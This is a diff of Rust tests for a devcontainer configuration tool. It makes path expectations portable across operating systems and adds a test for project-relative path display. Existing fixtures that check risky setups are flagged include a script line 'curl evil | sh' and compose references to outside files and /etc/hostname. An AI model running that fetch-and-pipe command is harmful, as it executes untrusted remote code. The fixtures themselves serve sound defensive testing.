@@ -5,6 +5,8 @@ use std::path::Path;
 
 use super::config::{self, Cmd, LocalEnv, Source};
 use super::plan::{self, Engine, Engines, Level};
+// Expected host paths are built the way the config's are: with this OS's separators.
+use crate::util::os::path::from_slash;
 
 fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
     let d = tempfile::tempdir().unwrap();
@@ -75,7 +77,7 @@ fn rust_template() {
     let wm = c.workspace_mount.as_ref().unwrap();
     assert_eq!((wm.kind.as_str(), wm.source.as_str()), ("bind", root.to_str().unwrap()));
     assert_eq!(c.mounts[0].kind, "volume");
-    let id = config::devcontainer_id(root.to_str().unwrap(), root.join(".devcontainer/devcontainer.json").to_str().unwrap());
+    let id = config::devcontainer_id(root.to_str().unwrap(), root.join(from_slash(".devcontainer/devcontainer.json")).to_str().unwrap());
     assert_eq!(c.mounts[0].source, format!("devcontainer-cargo-cache-{id}"));
     assert_eq!(c.forward_ports.iter().map(|p| p.port).collect::<Vec<_>>(), vec![8080, 5173]);
     assert_eq!(c.forward_ports[0].label.as_deref(), Some("api"));
@@ -153,7 +155,7 @@ fn python_dockerfile_template_with_variables() {
     let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
     match &c.source {
         Source::Dockerfile { dockerfile, context, args, target, cache_from, .. } => {
-            assert_eq!(dockerfile, &root.join(".devcontainer/Dockerfile").display().to_string());
+            assert_eq!(dockerfile, &root.join(from_slash(".devcontainer/Dockerfile")).display().to_string());
             assert_eq!(context, &root.display().to_string());
             assert_eq!(args["VARIANT"], "3.12-bookworm");
             // Display values keep host variables as written.
@@ -233,7 +235,7 @@ fn compose_template_with_a_database() {
     match &c.source {
         Source::Compose { files, service, run_services } => {
             assert_eq!(files[0], root.join("docker-compose.yml").display().to_string());
-            assert_eq!(files[1], root.join(".devcontainer/docker-compose.extend.yml").display().to_string());
+            assert_eq!(files[1], root.join(from_slash(".devcontainer/docker-compose.extend.yml")).display().to_string());
             assert_eq!(service, "app");
             assert_eq!(run_services, &vec!["app".to_string(), "db".to_string()]);
         }
@@ -347,11 +349,12 @@ fn compose_references_are_graded_and_covered() {
         assert_ne!(build().hash, before, "{f}");
     }
 
-    // Files outside the project, and ones only known when compose runs, are dangers.
+    // Files outside the project, and ones only known when compose runs, are dangers. (The
+    // absolute paths are quoted: on Windows they are `C:\…`, backslashes and a colon.)
     std::fs::write(
         root.join(".devcontainer/docker-compose.yml"),
         format!(
-            "include: [{o}/evil.yml]\nservices:\n  app:\n    image: x\n    env_file: {o}/host.env\n  v:\n    extends: {{file: \"${{BASE}}.yml\", service: b}}\n  r:\n    extends: {{file: ~/base.yml, service: b}}\nsecrets:\n  s:\n    file: /etc/hostname\n"
+            "include: ['{o}/evil.yml']\nservices:\n  app:\n    image: x\n    env_file: '{o}/host.env'\n  v:\n    extends: {{file: \"${{BASE}}.yml\", service: b}}\n  r:\n    extends: {{file: ~/base.yml, service: b}}\nsecrets:\n  s:\n    file: /etc/hostname\n"
         ),
     )
     .unwrap();
@@ -449,6 +452,20 @@ fn escapes_through_links_parents_and_features_are_flagged() {
     assert!(p.files.iter().any(|f| f == ".devcontainer/local/install.sh"), "{:?}", p.files);
     std::fs::write(root.join(".devcontainer/local/install.sh"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
     assert_ne!(plan::build(root, c, b"", &engines(true, false)).hash, p.hash);
+}
+
+/// The paths a plan shows (covered files, risks' items) are project-relative and written
+/// with `/` on every OS, as repository paths are; paths elsewhere stay as they are.
+#[test]
+fn shown_paths_are_project_relative_with_slashes() {
+    let d = project(&[]);
+    let root = d.path();
+    let abs = |rel: &str| root.join(from_slash(rel)).display().to_string();
+    assert_eq!(super::rel_display(root, &abs(".devcontainer/deeper/b2.yml")), ".devcontainer/deeper/b2.yml");
+    assert_eq!(super::rel_display(root, &abs("tools/Dockerfile")), "tools/Dockerfile");
+    assert_eq!(super::rel_display(root, &root.display().to_string()), ".");
+    let elsewhere = root.parent().unwrap().join("elsewhere").join("x.yml").display().to_string();
+    assert_eq!(super::rel_display(root, &elsewhere), elsewhere);
 }
 
 #[test]
